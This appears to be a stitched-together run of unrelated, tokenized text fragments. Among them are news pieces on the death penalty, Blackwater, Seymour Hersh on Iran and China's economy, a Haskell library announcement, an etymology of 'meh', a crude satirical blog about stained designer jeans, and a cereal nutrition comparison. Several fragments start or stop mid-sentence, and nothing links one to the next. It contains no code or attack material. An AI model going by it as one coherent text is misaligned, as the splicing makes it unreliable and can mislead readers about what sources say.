“ The elite per­form­ers are dis­tin­guished by the struc­tur­ing of their learn­ing process .
It is impor­tant to under­stand the role of emo­tions : they are not “ bad ” .
They are very use­ful sig­nals .
It is impor­tant to become aware of them to avoid being engulfed by them , and learn how to man­age them . ” — Dr. Steen­barg­er , Asso­ciate Pro­fes­sor of Behav­ioral Sci­ences at SUNY Upstate Med­ical Uni­ver­si­ty , and author of the book Enhanc­ing Trad­er Per­for­mance .
Myth 10 : This all sounds too soft to be of real val­ue to man­agers and pro­fes­sion­als .
Real­i­ty :
There is noth­ing soft about the hard sci­ence - based train­ing of spe­cif­ic cog­ni­tive and emo­tion­al skills .
“ I can eas­i­ly see the rel­e­vance in high­ly com­pet­i­tive fields , such as pro­fes­sion­al sports and mil­i­tary train­ing . ” — Dr. Bradley Gib­son , Direc­tor of the Per­cep­tion and Atten­tion Lab at Uni­ver­si­ty of Notre Dame .

ANGEL DIAZ took part in a robbery in Miami , in 1979 , and was convicted seven years later of killing a bar manager during the crime .
In December the state of Florida executed him by lethal injection .
But Mr Diaz took twice as long to die as is usual , and some thought they saw him grimace in pain when he should have been unconscious and paralysed .
When it was finally over , he had foot - long burns on each arm .
A report into his grisly last moments was released on Thursday March 1st , with recommendations for Florida 's new governor , Charlie Crist .
It concluded that what happened to Mr Diaz will almost certainly happen again — the needles that punctured his veins went in too far and injected the drugs into his flesh , requiring a second injection .
And yet the report merely recommended better training for execution teams , and the elimination of one of the three drugs in the execution cocktail ( the one paralysing the prisoner , which may mask whether he is in pain ) , along with other tweaks .
The death penalty is safe in Florida for now .
Florida is keener on the death penalty than most states , although Texas , Virginia , Missouri and Oklahoma each execute more .
Since the Supreme Court reinstated the death penalty in 1977 , just over 1,000 people have been executed , with a peak in 1999 .
Since then , however , America 's ardour for executions has declined .
Not only are fewer on death row actually being executed .
From 317 in 1996 , the number of new death sentences has dropped steadily to 114 last year .
By law , only jurors who agree in principle with the possibility of the death penalty are allowed to serve on capital juries .
This , naturally , tends to bias juries towards the death penalty .
Yet even those who theoretically agree with death sentences are showing themselves more reluctant to hand them out .
The trend is matched by federal jurisprudence and by actions of the states .
Execution is typically a state affair under laws chosen by state legislatures , but takes place within federal legal guidelines .
In the past few years , the Supreme Court eliminated two of the most egregious kinds : in 2002 it stopped executions of the mentally retarded ; in 2005 it called a halt to the death penalty for those who were minors when they committed their crimes .
Many big states have begun to move tentatively against the death penalty , too .
In 2000 Illinois 's governor imposed a moratorium on executions , saying he could n't be sure that the process was working properly .
In 2004 , New York 's state Supreme Court struck down the execution law in the state on similar grounds ; the state legislature has declined to reinstate it , leaving New York with a de facto moratorium .
A commission in New Jersey reported in January that there is little chance that state 's execution law can be made to conform with the state 's constitution , and recommended doing away with it .
Washington state last year came within one judicial vote ( in a 4 - 5 split ) of binning the death penalty , after a confessed murderer of one woman was put to death while a serial murderer of 48 victims had received life in prison after co-operating with the authorities .
By one count last year , the death penalty was “ on hold ” in some form in eight states , thanks to the evidence that it is applied arbitrarily ( as in the Washington example ) , incompetently ( as in the Diaz case ) , incorrectly ( Florida has released 22 prisoners from death row on grounds of innocence in 34 years ) , or with racial bias ( blacks get it more often than whites ) .
Does this glimpse of a trend mean America as a whole may yet abolish the death penalty ?
Not any time soon .
Public opinion continues , heavily , to support its use .
But when pollsters add the option of “ life without parole ” to their questions , the death penalty 's support drops to about even with non-death punishments .
The use of the death penalty may yet become rarer , if not extinct , in America .
Test Track is one of Epcot 's more popular rides , simulating in about two minutes the extremes that GM puts its vehicles through before they 're ready for market .
The ride ends with a violent 15 - second loop at 60 mph around a track .
But we can't leave before walking through a showroom featuring GM 's latest models .
Strange sight :
In a place where you 'd expect to see the cars of tomorrow -- the hybrids , the flex - fuelers , the reformed guzzlers teetotaling toward energy sobriety -- every single one of the six or seven vehicles I saw had in - city gas - efficiency of between 12 and 18 mpg , and only marginally better highway mileage .
The sticker on every vehicle displayed estimated its yearly cost of gas alone at $ 3,000 , based on the average 15,000 miles a year we drive , and on $ 2.80 - per- gallon gas ( I paid 40 cents per gallon more at a station on LPGA Boulevard last Thursday ) .
That GM is a lumbering company losing market share to a future it has yet to imagine is n't news .
What struck me was that sticker price on a year 's worth of gas .
It does n't hit you that way when you 're filling up at your usual station , even when the bill adds up to $ 40 for a lousy 12 gallons or so .
But if a two - car , two - job family drives anywhere near the average mileage for a year , the total adds up to $ 6,000 -- the equivalent of a family 's health insurance premiums for a year .
That 's $ 12,000 right there , a quarter of the median household income of $ 48,200 .
Numbers like that begin to explain the disconnect between the two economies we 're living through .
Here 's what the White House says in its latest economic " fact sheet " : " October 2007 marks record 50th consecutive month of job growth . . . 8.31 million jobs created since August 2003 in longest continuous months of job growth on record . . .
The economy has now experienced six years of uninterrupted growth , averaging 2.8 percent a year since 2001 . . . after - tax per capita personal income has risen by 12.7 percent -- an average of over $ 3,800 per person -- since President Bush took office . "
And so on .
We should be dancing in the streets .
Then why , on average for all seven years of Bush 's presidency , have just 12 percent of Americans rated the economy as getting better ( compared with a 52 percent average during Clinton 's last five years ) ?
Why have those saying that their financial situation worsened averaged 38 percent , or just about one in four Americans ( compared with 26 percent saying so during the Clinton years ) ?
The numbers Bush 's White House fact sheet do n't show answer the questions .
Take that household income figure again , but instead of the overall mean , take as a base the median family income in the United States : $ 59,894 , which assumes the middle - class comforts of two jobs , two incomes , two cars .
Then start subtracting the average cost for traditional budget items , as listed by the U.S. Bureau of Labor Statistics , and adjusted for 2007 dollars , even though the numbers lowball reality .
( See information box for a detailed breakdown of the budget . )
The total ?
$ 60,418 .
We 're already in a $ 524 deficit , and that 's assuming the household indulges in no alcohol , no entertainment , no vacations , no cable television , no subscriptions , experiences no medical emergencies , saves not a dime and -- most unrealistic of all -- has no credit - card debts to finance .
Add some or all those costs into the equation , and the deficit grows into the thousands .
Which explains the nation 's revolving debt load ( not including mortgages and car payments ) , now approaching $ 1 trillion , or an average of more than $ 8,100 per household .
It also explains the sort of choices families must make daily to make ends meet .
Go without insurance ?
Skip on a better college education ?
Let the house fall into disrepair ?
Take on a third job ?
A fourth credit card ?
Every question implies that there is no longer a valid connection between the economy 's rosy numbers and the real life of the average American family , whose nominal wealth is mortgaged to subsistence living with no room for crises .
Despite the economic unease , the National Retail Federation 's latest survey has the average shopper promising to spend $ 923 this holiday season , up 24 percent from 2003 .
It 's admittedly ironic to think of this economic disconnect while ambling about at Disney , where a single day can easily cost a family of four $ 600 .
Judging from Disney 's latest figures ( $ 1.71 billion in profits at its theme parks alone ) , the place is n't lacking for visitors .
But Disney is as symbolic a place as any for what carelessly fuels and ails American consuming :
It 's where debt comes true .
Sooner or later , the fantasy ride ends .

The mehness of it is indescribable .
Just one big , fat meh .
If you are an old - media kind of reader , " meh " wo n't mean a whole lot to you .
The word has appeared in the national press three times in the past year .
If you gain new vocabulary from conversation , it is probably unfamiliar .
If you can't be torn from the web , however , you will almost certainly know it , and its meaning .
Meh means rubbish .
It means boring .
It means not worth the effort , who cares , so - so , whatever .
It is the all - purpose dismissive shrug of the blogger and messageboarder .
And it is ubiquitous .
On the I Love Music messageboard , for example , 4,010 separate discussion threads feature the use of " meh " .
No one is quite sure where it comes from .
Graeme Diamond , principal editor of the new word group at the Oxford English Dictionary , says it 's not yet suitable for the OED , but he does have a " meh " file , and the first recorded print usage occurred in the Edmonton Sun newspaper in Canada in 2003 : " Ryan Opray got voted off Survivor .
Meh . "
He thinks , however , it sprang into common usage from the Simpsons .
I can enlighten him further .
Some credit the 2001 episode Hungry Hungry Homer with the first use of " meh " as a dismissal , when Homer asks Lisa and Bart if they want to go to the Blockoland theme park and receives the answer , " meh " .
But the Language Log website notes a 1995 episode in which Bart dismisses Marge 's discussion of weaving with a " meh " .
Some amateur etymologists on the web reckon meh is derived from Yiddish , pointing to a 1936 song that uses it as the sound of a goat bleating .
A poster on Artblog . net called it a " Yiddish interjection used to express disdain that borders on apathy " , but did not source it .
" Many North American English interjections do have some basis in Yiddish , " accepts Diamond .
But does this one ?
" I ca n't say . "
In any case , the word needs to pass into " widespread unselfconscious usage " before it will feature in the OED , he says .
And with a print lifespan of just four years , so far , that is some distance away .
But does he think it 's becoming more common ?
" Well , I had fishcakes at lunchtime and I told someone they were ... meh . "
[ Haskell ] ANNOUNCE : ndp-0.1 , nested data parallelism in Haskell
We are pleased to announce the first release of the NDP package , a library for writing nested data - parallel programs on shared - memory multiprocessors .
The NDP library is part of the Data Parallel Haskell project .
For a description of the project , see http://haskell.org/haskellwiki/GHC/Data_Parallel_Haskell.
At the moment , the library is far from complete and contains numerous bugs and inefficiencies .
However , it can be used for writing simple data - parallel programs .
The paper " Data Parallel Haskell : a status report " ( http://www.cse.unsw.edu.au/~chak/papers/CLPKM07.html) describes the underlying design and go through an example program .
This release includes the following features : * Efficient , flat data - parallel arrays with a wide range of sequential and parallel operations .
* Preliminary support for segmented arrays .
* Automated fusion of sequential and parallel array operations .
* Example programs .

Another hustler , whose first name is Kenny and whose street name is Little Daddy ( he is 5 feet 3 inches tall ) , said he could always tell how good his opponent was in the first couple of moves .
For example , he said , if someone moves quickly but fumbles the pieces , or uses one hand to move the pieces and the other to hit the clock , which is against the normal rules of speed chess , then the person is not experienced .
Little Daddy , who said he started playing street chess in 1976 , said he won about 80 percent of the time .
A crucial part of the game is not to win too quickly , he said .
“ You make the games close , ” he said .
“ You do n’t want to crush them .
You want to leave their ego intact , because you want to keep them coming back . ”
Russian Paul , who displayed the opening knowledge , speed and tactical ability of a master ( but not the much higher grandmaster ) , said he had been playing in the streets for about 15 years and always tried to win .
“ If they get scared away , it is not my problem , ” he said .
Like bartenders , the chess hustlers have names for people who keep coming back and coughing up money : regulars , or customers .
Little Daddy said that every hustler  there are about a dozen in Union Square , although the number fluctuates during the day  had at least a couple of regulars .
On this particular night , Carl Neblett , a regular , was taking on Junior , who always wears a baseball cap and keeps up a running commentary as he chain - smokes his way through games .

CAIRO ( Reuters ) - Egyptian archaeologists have found what they said could be the oldest human footprint in history in the country ’s western desert , the Arab country ’s antiquities ’ chief said on Monday .
“ This could go back about two million years , ” said Zahi Hawass , the secretary general of the Egyptian Supreme Council of Antiquities .
“ It could be the most important discovery in Egypt , ” he told Reuters .
Archaeologists found the footprint , imprinted on mud and then hardened into rock , while exploring a prehistoric site in Siwa , a desert oasis .
Scientists are using carbon tests on plants found in the rock to determine its exact age , Hawass said .
Khaled Saad , the director of prehistory at the council , said that based on the age of the rock where the footprint was found , it could date back even further than the renowned 3 - million year - old fossil Lucy , the partial skeleton of an ape - man , found in Ethiopia in 1974 .
Most archaeological interest in Egypt is focused on the time of the pharaohs .
Previously , the earliest human archaeological evidence from Egypt dated back around 200,000 years , Saad said .

Mount Everest is literally located at the top of the world , rising 29,035 feet ( 8850 meters ) above sea level .
As soon as it was crowned the world 's tallest mountain , people inevitably had to climb it .
And just as inevitably , many of them failed .
While more than 2,200 people have succeeded , nearly 200 have lost their lives attempting the climb .
So why climb Everest ?
The most famous answer to this question came from climber George Mallory : " because it is there . "
Though he was likely responding in frustration after being asked the same question dozens of times , his answer succinctly cuts to the heart of the matter .

In this article , we 'll examine the history of climbing Mount Everest , see what routes most climbers use and find out what climbers take with them to survive the trek .
Everest has n't always been considered the king of mountains .
It was n't until 1852 that a Bengali mathematician and surveyor named Radhanath Sikhdar determined that " Peak XV " was actually the highest point on the earth .
In 1865 , Sikhdar 's discovery was confirmed .
India 's Surveyor General Sir Andrew Waugh renamed the mountain Mount Everest after Sir George Everest , the previous Surveyor General and the person overseeing the original survey that listed " Peak XV . "
The Nepalese who live to the south of Mount Everest have always known that it was special .
They called it Sagarmatha , which is translated variously as " goddess of the sky " and " forehead of the sky . "
The Tibetans living north of the mountain called it Chomolungma , or " mother goddess of the world . "
Politics kept would - be climbers out of Everest for many years following its discovery , because neither the Nepalese nor Tibetan governments welcomed strangers into their countries .
But in 1921 , after much diplomatic negotiation , Tibet opened its borders and the first of many British expeditions began on the mountain 's north side .
Take a look at the next page to learn about the first expeditions to explore Mount Everest .

WASHINGTON , Oct. 1 — Guards working in Iraq for Blackwater USA have shot innocent Iraqi civilians and have sought to cover up the incidents , sometimes with the help of the State Department , a report to a Congressional committee said today .
The report , based largely on internal Blackwater e-mail messages and State Department documents , depicts the security contractor as being staffed with reckless , shoot - first guards who were not always sober and did not always stop to see who or what was hit by their bullets .
In one incident , the State Department and Blackwater agreed to pay $ 15,000 to the family of a man killed by “ a drunken Blackwater contractor , ” the report said .
As a State Department official wrote , “ We would like to help them resolve this so we can continue with our protective mission . ”
The report was compiled by the Democratic majority staff of the House Committee on Oversight and Government Reform , which is scheduled to hold a hearing on Blackwater activities on Tuesday .
That hearing is sure to be contentious now that the chairman , Representative Henry A. Waxman , Democrat of California , and other members have the staff ’s findings to study .

Ban BZP , but not dihydrogen monoxide
National MP Jacquie Dean , having jumped on the anti-party pill political bandwagon , can't seem to get off it even as the legislation banning BZP is going through the House , Progressive Party leader Jim Anderton said today .
" Talk about flogging a dead horse .
" The latest from her is that I am leaving City Councils to do " my dirty work " ( her words not mine ) by banning party pills from liquor outlets .
" I do n't see making an evidence - based decision to ban BZP nationally , after commissioning research and listening to experts is in any shape or form dirty work .
" Councils like Manukau are responding to the evidence now available on BZP .
Banning pills from being sold in liquor outlets seems a good idea to me as pills mixed with alcohol make them even more harmful and I commend the Manukau City Council for its concern .
" But , banning BZP and related party pills altogether is an even better idea which is why I 'm recommending it to the House .
" However , I will not be banning dihydrogen monoxide or asking for the experts to consider it , which is the latest bandwagon Ms Dean is looking to jump on .
" Because as I informed her , in response to her recent letter to me on the matter – dihydrogen monoxide is water ! "

The United States Constitution is the supreme law of the United States .
The Constitution , originally comprising seven articles , delineates the national frame of government .
Its first three articles embody the doctrine of the separation of powers , whereby the federal government is divided into three branches : the legislative , consisting of the bicameral Congress ; the executive , consisting of the President ; and the judicial , consisting of the Supreme Court and other federal courts .
Articles Four , Five and Six embody concepts of federalism , describing the rights and responsibilities of state governments and of the states in relationship to the federal government .
Article Seven establishes the procedure subsequently used by the thirteen States to ratify it .
It is regarded as the oldest written and codified constitution in force of the world .
The Rev. Ted Haggard , the former president of the National Association of Evangelicals and one of the nation ’s most influential Christian leaders , admitted today that he had purchased the illegal drug methamphetamine from a gay escort in Denver , but denied that he ever had sex with the man .
Mr. Haggard resigned as president of the evangelical association and stepped aside as senior pastor of the New Life mega-church in Colorado Springs , Colo. , on Thursday after Michael Forest Jones , a self - described former gay prostitute , accused him of having a sexual affair for three years and using the drug , commonly known as crystal meth , during those encounters .
Earlier , in an e-mail message sent to parishioners and obtained by local news media , Ross Parsley , the acting pastor of the New Life Church said , “ It is important for you to know that he confessed to the overseers that some of the accusations against him are true . ”
Speaking to the Denver television station KUSA outside his house in Colorado Springs today , Mr. Haggard said a Denver hotel referred him to Mr. Jones for the purpose of getting a massage .
He said he met with Mr. Jones and bought the drug .
“ I was tempted , I bought it , but I did not use it , ” he said today .
The station posted the video interview on its Web site .

I 'm still wearing a $ 20 pair that I got on clearance at the Gap !.... 4 years ago !
Anyway , I was taken aback by the price , but I decided to unfold the jeans to see if there was something special about them that warranted the outrageous price .
There was ..... in the form of $ 150 for jeans withI hate to think that some douchebag is walking around New York City telling people he just got done working on his car .
You 've been sitting in Starbucks , sipping your White Chocolate Mochaccino while staring at your reflection on the back of a spoon !
Even if you had a car , you would n't know how to work on it .
I sincerely question your ability to even unlock the doors without pushing a button on the keychain !
I quickly put that pair back on its shelf , and moved on to another pair by a different , but equally unheard - of , brand .
This pair cost $ 180 .
Once again , I unfolded them to see if there was more to them , and again there was ..... in the form of FAKE INK STAINS !
Is this a new trend ?
Actually , for New York , this is a little more believable .
I can totally picture some douchebag at a happy hour saying to a girl : " ... yeah , my company let us wear jeans to work since it was casual friday , and of all days , my stupid pen had to explode .
I mean come on !
Who uses Bic anyway ?
I told my boss that I 'm going to quit if he does n't start buying Cross pens !
That cheap bastard ....... Bartender , I 'll take another Cosmo ...
" In any case , I 've decided that I want to become a jeans designer , because there 's obviously a lot of money to be made in doing this .
I even came up with my first three designs , which I developed using my high - quality graphic design software ... you may have heard of it , its called Paint .
Poop
This pair features a stain that makes you look like you do n't wipe your ass very well , or at all .
For that matter , it makes you look like you did n't even take your pants off .
This jean is perfect for guys who are having trouble with their masculinity .
You could say to the ladies " Real men only use single - ply " .
Maybe even , " Poop first , ask questions later . "
Price : $ 140 More important than stain however , is the intricate stitching on the back pocket of all of the jeans in my collection .
For those of you who are not fashion aficionados like I am , an intricate but completely unnecessary stitch pattern on the back pocket designates " designer jeans .
"
PeeThis pair has been cleverly dyed to look like you peed yourself .
Perfect for frat boys , and wanna - be frat boys , especially in the Murray Hill area .
Picture this , you wear these jeans to the bar ( do n't forget the Lacoste polo , popped collar ) and quickly order 5 beers .
Then when no one is looking , pour 4 of your beers out in the corner and then go tell your friends , " I just pounded 4 beers , man !
Yeah , I peed myself , but I 'm soooooooo wasted . "
Then pound the 5th beer .
Everyone will think you are the coolest guy ever and the girls will flock to you .
Price : $ 170 .
PopHook up stories are always great , and nothing is better than having a hookup story AT the bar .
Wear these jeans when you go to meet up with friends at a bar .
When they ask you where you were , you say " Dude , I just got a BJ from [ point to hot chick ] in the bathroom . "
When they do n't believe you , just show them the cleverly placed fake jizz stains on your jeans as proof .
All of your friends will think you are cool and will commence buying you drinks .
Hot girls will see your friends treating you like God and will become very attracted to you .
Price : $ 220 ( extra dyeing and bleaching required for these stains ) I needed a name for my jeans and I decided to name them after their theme :
But that did n't sound that great , so I dropped the ' body ' part of it and made functions singular : Better , but not that great .
REAL designer jeans ( like ' energie ' - the brand my roommate owns ) have misspellings that are oh - so trendy .
I came up with :
Not quite there yet .... I changed another letter and made it capital .
And introducing my new line of jeans : I 'm gonna be so rich .
Scientists have attempted to disprove Albert Einstein 's theory of general relativity for the better part of a century .
After testing and confirming Einstein 's prediction in 2002 that gravity moves at the speed of light , a professor at the University of Missouri - Columbia has spent the past five years defending the result , as well as his own innovative experimental techniques for measuring the speed of propagation of the tiny ripples of space - time known as gravitational waves .
Sergei Kopeikin , associate professor of physics and astronomy in the College of Arts and Science , believes that his latest article , " Gravimagnetism , causality , and aberration of gravity in the gravitational light - ray deflection experiments " published along with Edward Fomalont from the National Radio Astronomical Observatory , arrives at a consensus in the continuing debate that has divided the scientific community .
An experiment conducted by Fomalont and Kopeikin five years ago found that the gravity force of Jupiter and light travel at the same speed , which validates Einstein 's suggestion that gravity and electromagnetic field properties , are governed by the same principle of special relativity with a single fundamental speed .
In observing the gravitational deflection of light caused by motion of Jupiter in space , Kopeikin concluded that mass currents cause non-stationary gravimagnetic fields to form in accordance with Einstein 's point of view .
The research paper that discusses the gravimagnetic field appears in the October edition of Journal of General Relativity and Gravitation .
Einstein believed that in order to measure any property of gravity , one has to use test particles .
“ By observing the motion of the particles under influence of the gravity force , one can then extract properties of the gravitational field , ” Kopeikin said .
“ Particles without mass – such as photons – are particularly useful because they always propagate with constant speed of light irrespectively of the reference frame used for observations . ”
The property of gravity tested in the experiment with Jupiter also is called causality .
Causality denotes the relationship between one event ( cause ) and another event ( effect ) , which is the consequence ( result ) of the first .
In the case of the speed of gravity experiment , the cause is the event of the gravitational perturbation of photon by Jupiter , and the effect is the event of detection of this gravitational perturbation by an observer .
The two events are separated by a certain interval of time which can be measured as Jupiter moves , and compared with an independently - measured interval of time taken by photon to propagate from Jupiter to the observer .
The experiment found that two intervals of time for gravity and light coincide up to 20 percent .
Therefore , the gravitational field cannot act faster than light propagates . ”
Other physicists argue that the Fomalont - Kopeikin experiment measured nothing else but the speed of light .
“ This point of view stems from the belief that the time - dependent perturbation of the gravitational field of a uniformly moving Jupiter is too small to detect , ” Kopeikin said .
“ However , our research article clearly demonstrates that this belief is based on insufficient mathematical exploration of the rich nature of the Einstein field equations and a misunderstanding of the physical laws of interaction of light and gravity in curved space - time . ”

Hersh : ' War with Iran will be about protecting the troops in Iraq ' Greg Wasserstrom and Mike Aivaz

The only thing different about the Bush Administration 's rhetoric about Iran and statements made regarding Iraq before the US invasion in 2003 are the words chosen , says journalist Seymour Hersh .
" They 've changed their rhetoric , really .
The name of the game used to be nuclear threat , " Hersh said on CNN's Late Edition with Wolf Blitzer , adding a moment later , " They 've come to the realization that it 's not selling , it is n't working .
The American people are n't worried about Iran as a nuclear threat certainly as they were about Iraq .
So they 've switched , really . "
The Bush Administration is all but set to authorize a campaign of limited , surgical airstrikes against Iranian targets , Hersh reports in the New Yorker 's latest edition .
In his piece , Hersh writes , " During a secure videoconference that took place early this summer , the President told Ryan Crocker , the U.S. Ambassador to Iraq , that he was thinking of hitting Iranian targets across the border and that the British ' were on board ' ...
Bush ended by instructing Crocker to tell Iran to stop interfering in Iraq or it would face American retribution . "
The sites in Iran being targeted , however , reflect the change in the White House 's selling of armed conflict with Iran .
" Instead of ... hitting the various [ nuclear ] facilities we know that exist , instead they 're going to hit the Iranians as payback for hitting us [ in Iraq ] , " Hersh told Blitzer in the CNN interview .
Such targets , Hersh says , would include Iran 's Revolutionary Guard headquarters and other sites of Iran 's alleged support for the insurgency in Iraq .
Hersh does not seem to think that direct conflict with Iran is inevitable however .
He writes : " I was repeatedly cautioned , in interviews , that the President has yet to issue the ' execute order ' that would be required for a military operation inside Iran , and such an order may never be issued .
But there has been a significant increase in the tempo of attack planning .
In mid-August , senior officials told reporters that the Administration intended to declare Iran 's Revolutionary Guard Corps a foreign terrorist organization .
And two former senior officials of the C.I.A. told me that , by late summer , the agency had increased the size and the authority of the Iranian Operations Group . "
Those statements were echoed in the piece by former National Security Adviser Zbigniew Brzezinski .
" ' A lot depends on how stupid the Iranians will be , ' Brzezinski told me .
' Will they cool off Ahmadinejad and tone down their language ? '
The Bush Administration , by charging that Iran was interfering in Iraq , was aiming ' to paint it as ' We 're responding to what is an intolerable situation , '' Brzezinski said .
' This time , unlike the attack in Iraq , we 're going to play the victim .
The name of our game seems to be to get the Iranians to overplay their hand . ' "

our attention to the Financial Times , which yesterday
reported
In a little - noticed mid-summer announcement , the Asian Development Bank presented official survey results indicating China 's economy is smaller and poorer than established estimates say .
The announcement cited the first authoritative measure of China 's size using purchasing power parity methods .
The results tell us that when the World Bank announces its expected PPP data revisions later this year , China 's economy will turn out to be 40 per cent smaller than previously stated .
This more accurate picture of China clarifies why Beijing concentrates so heavily on domestic priorities such as growth , public investment , pollution control and poverty reduction .
The number of people in China living below the World Bank 's dollar - a- day poverty line is 300 m - three times larger than currently estimated .
on a rather gulp - inducing finding from the Asian Development Bank :
That 's quite a revision .
The included poverty statistic is stunning , to say the least .
It should remind us how valuable Chinese growth is to the fight against global poverty ; measures that restrict trade with China may be popular in America and Europe , but they would be devastating to a country where hundreds of millions of people can only dream of developed - nation incomes .
These revisions should also reduce our expectations for rapid growth in Chinese domestic demand , and they should shame political leaders who refuse to act on climate change without similar steps from China .
On the other hand , this news should not meaningfully change our perception of China 's place in the global economy .
A 40 percent write - down in the size of the economy sounds massive , but at recent growth rates , it only represents about a five year setback .
That 's the magic of double - digit annual output growth .
If China can maintain anything like its current growth pace , those poverty numbers should look significantly better in no time at all .

Breakfast Cereal Compared : Cereals from Post , Kellogg 's & General Mills
So , what did you eat for breakfast this morning ?
More likely than not , it was cereal .
In fact , cereal is n't even just a breakfast food .
You could have eaten it for breakfast , lunch , dinner , or a snack in between .
You could have eaten it in a bowl with milk , in a bowl without milk , or just by taking handfuls right out of the box .
Cereal is one of those anytime foods .
And it makes sense too .
It 's as quick and easy as can be , and it just so happens that most cereals taste fantastic .
Of course , not all breakfast cereal is equal .
Despite coming in similar sized boxes , with similar shaped pieces , for similar priced prices , there are quite a few differences between most cereals .
Some claim to be high in whole grains and fiber , to be a good source of vitamins and minerals , and to be good for your heart and cholesterol .
Others however just want you to see their " wacky " cartoon characters and " fun " shapes and colors .
Even still , the biggest differences lie not on the front of the cereal boxes , but rather on the back .
It is there , my friends , where the important differences can be found .
To help show this , I 've put together a side - by - side comparison of over 50 of the most popular breakfast cereals from Post , Kellogg's , General Mills and more to see how they all stack up against each other in terms of their nutritional content and ingredients .
Also included at the end are my picks for the best and worst cereals .
So , if you 've only been eating cereal based on how yummy it is , here is your chance to start taking nutrition into account as well .

The Best Breakfast Cereals
Here are the cereals that came across as being the best ( aka most healthy ) .
When picking these cereals , I used the following requirements .
First and foremost , they had to contain absolutely no trans fat .
Second , they had to contain no saturated fat .
Third , they had to contain little to no sugar .
Then , after that , I started taking fiber content into account ( higher the better ) and added the cereals that contained a good amount of fiber ( yet still fit the first three guidelines ) to this list too .
I also paid attention to protein content as well as whether the cereal contained any HFCS ( high fructose corn syrup ) , although I did not treat these two quite as importantly as I did the above guidelines .
The final thing I took into consideration was the ingredients and whether the cereal was made from whole grains ( good ) or refined grains ( not so good ) .
So , in no specific order , here are my picks for the best breakfast cereals :
Cheerios ( General Mills )
Shredded Wheat ( Post )
Fiber One ( General Mills )
Grape Nuts ( Post )
Wheaties ( General Mills )
Total ( General Mills )
GOLEAN Cereal ( Kashi )
All - Bran ( Kellogg's )
Wheat Chex ( General Mills )
The Worst Breakfast Cereals
Here are the cereals that came across as being the worst ( aka most unhealthy ) .
First , any cereal that contained trans fat was automatically added to this list , as trans fat is easily the most unhealthy ingredient a cereal could have .
Second , I looked at sugar content .
Every cereal that contained 10 or more grams of sugar per serving ( which did n't come from actual fruit ) made this list as well .
Now , does that mean a cereal with 9 grams of sugar is healthy ?
Of course not .
I just used 10 as the sugar cut off number when listing the absolute worst cereals in this comparison .
If the above cereals are the best , and these are the worst , whatever is n't on either list falls somewhere in between .
You should use what you 've learned here along with your own good judgement when deciding if you should eat one of those cereals .
So moving on , in no specific order , here are my picks for the worst breakfast cereals :
Honey Smacks ( Kellogg's )
Corn Pops ( Kellogg's )
Apple Jacks ( Kellogg's )
Franken Berry ( General Mills )
Trix ( General Mills )
Eggo Cereal Maple Syrup ( Kellogg's )
Basic 4 ( General Mills )
Smorz ( Kellogg's )
Oreo O's ( Post )
Froot Loops ( Kellogg's )
Cocoa Puffs ( General Mills )
Count Chocula ( General Mills )
Waffle Crisp ( Post )
Reese 's Puffs ( General Mills )
Mini-Swirlz Cinnamon Bun ( Kellogg's )
Frosted Krispies ( Kellogg's )
Cocoa Pebbles ( Post )
Fruity Pebbles ( Post )
Cookie Crisp ( General Mills )
Frosted Flakes ( Kellogg's )
Golden Grahams ( General Mills )
Lucky Charms ( General Mills )
Rice Krispies Treats Cereal ( Kellogg's )
Breakfast Cereal Comparison FAQ
Just in case anything in the above comparison was a little unclear , here is a quick Q&A that will hopefully clear it all up .
What does " Contains Trans Fat " mean ?
All of the breakfast cereals compared have their trans fat content listed as " Trans fat : 0 grams . "
However , in some cases , some of these cereals are flat out lying to you and actually do contain trans fat .
Let me explain ...
By law , the FDA only requires food companies to list trans fat content if their food contains 0.5 grams or more of it in one serving .
That means if the food contains exactly 0.49999 grams of trans fat per serving , they get to say their food contains 0 grams of trans fat .
Yup , it 's insanely stupid .
But , that 's how it is .
That means if you eat a few servings of a food like this , you could end up eating a few grams of trans fat without even knowing it .
And even if you just eat the 1 serving , ANY trans fat is still too much trans fat , no matter what the amount .
Luckily though , there is a way to detect if a food ( in this case cereal ) contains any trans fat , even if the label says it does n't .
Just look at the ingredients .
If you see the term " hydrogenated " or " partially hydrogenated , " that means there is indeed trans fat present in that food .
So , for this breakfast cereal comparison , I literally read through each cereal 's list of ingredients to see if they REALLY contained any trans fat , and a surprising number of them did .
The ones that did have a " YES " listed in the " Contained Trans Fat " column , and the ones that legitimately did NOT contain any trans fat whatsoever have a " NO . "
What is HFCS ?
HFCS stands for high fructose corn syrup .
If you do n't know what it is , you can learn more about it here , here and here .
What 's the deal with the serving sizes ?
Why are some in grams instead of cups ?
Most of the breakfast cereals used cups as the unit of measure of their serving size .
However , there were a bunch that did not .
So , I was forced to list their serving size in whatever unit they gave it in ( which in most cases was grams ) .
Why are some of the supposed healthy cereals high in sugar ?
Here 's something to keep in mind when looking at sugar content in this comparison .
Some cereals are high in sugar because they are typical junk - food type cereals .
Others however are high in sugar because they contain fruit .
Obviously there is a bit of a difference here as the sugar in Oreo O's is a little different than the sugar in Raisin Bran .
Just something to keep in mind .
Are the rice - based cereals safe ?
I heard they contain arsenic ?
I also heard white rice is n't healthy .
Should I avoid these cereals ?
I 've actually already covered the topic of arsenic in rice ... feel free to check it out .
As for the second part of this question , you should definitely check out my comparison of White Rice vs Brown Rice to help you figure out which one is truly healthy after all .
I 'm a little confused about your " best " and " worst " cereal lists .
Can you explain them a little better ?
A quick clarification .
There were over 50 cereals in this comparison , and a good portion of them did n't make the best or worst list .
What that means is that none of those cereals fit the description of being either the VERY best , or the VERY worst .
This does n't mean they are healthy , and this does n't mean they are unhealthy .
It just means that they are n't at the very top in either category .
So , for example , there are some cereals not listed on the " best " list that are still alright , and there are some cereals not listed on the " worst " list that are still not - so - good .
Since making an " in the middle " list seemed like a silly idea , I did my best to provide enough nutrition information throughout this comparison to help you make informed decisions on your own about those other cereals .
Where did you get the nutritional content of all of these cereals from ?
All of the nutrition data used in this comparison came directly from the official web site of each cereal brand .
So , if anything seems screwy , take it up with them .
Also keep in mind that the cereal brands themselves included a little disclaimer with their nutrition information that went something along the lines of " This nutrition information could change .
In case this happens , check the package in the store before you buy it for the most current ingredients and nutrition facts . "
So , I guess this cereal comparison carries the same disclaimer .

READ the Russian - language internet , and you will find Estonia portrayed as a hell - hole ruled by Nazi sympathisers who organise a grotesque form of apartheid hypocritically endorsed by the European Union .
“ Nazi ” and “ apartheid ” are strong words that should be used sparingly and precisely out of their original context — and probably not at all .
( A good rule in most discussions is that the first person to call the other a Nazi automatically loses the argument . )
So it may be worth listing a few of the more grotesque unfairnesses and inaccuracies of the charge .
